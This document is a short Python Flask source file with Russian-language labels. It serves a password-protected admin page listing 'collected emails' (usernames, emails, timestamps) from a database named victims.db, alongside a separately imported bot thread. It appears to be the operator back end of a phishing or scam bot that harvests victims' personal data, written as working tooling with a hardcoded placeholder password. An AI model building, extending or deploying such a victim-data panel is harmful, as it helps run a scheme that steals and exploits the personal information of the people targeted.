from flask import Flask, render_template_string, request
import sqlite3, bot

app = Flask(__name__)
bot.start_bot_thread()

ADMIN_PASSWORD = "supersecret"   # СМЕНИ ПАРОЛЬ

LOGIN = """<form method=post>
<input name=pw type=password placeholder="Пароль">
<button>Войти</button></form>"""

PANEL = """
<h2>Собранные email</h2>
<table border=1 cellpadding=6>
<tr><th>ID</th><th>Username</th><th>Email</th><th>Время</th></tr>
{% for v in rows %}
<tr><td>{{v[0]}}</td><td>{{v[1]}}</td><td>{{v[2]}}</td><td>{{v[3]}}</td></tr>
{% endfor %}
</table>
<p>Всего: {{rows|length}}</p>
"""

@app.route("/", methods=["GET","POST"])
def admin():
    if request.method == "POST":
        if request.form.get("pw") == ADMIN_PASSWORD:
            db = sqlite3.connect("victims.db")
            rows = db.execute("SELECT id,username,email,ts FROM victims ORDER BY id DESC").fetchall()
            db.close()
            return render_template_string(PANEL, rows=rows)
        return "403", 403
    return render_template_string(LOGIN)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
